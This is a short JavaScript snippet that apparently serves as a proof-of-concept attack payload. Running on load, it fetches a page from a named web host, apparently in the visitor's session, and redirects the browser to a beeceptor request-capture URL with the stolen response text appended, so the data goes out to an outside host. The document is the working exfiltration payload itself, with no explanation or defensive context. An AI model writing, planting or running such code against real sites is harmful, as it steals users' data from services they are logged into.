function run() {

    let xhr = new XMLHttpRequest();

    let url = 'https://web-dev03.myharmony.com/';
    xhr.open("GET", url, true);

    xhr.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
           window.location.href = 'https://app.beeceptor.com/console/ergdrf?' + this.responseText ;
        }
    }
    // Sending our request 
    xhr.send();
}
run();
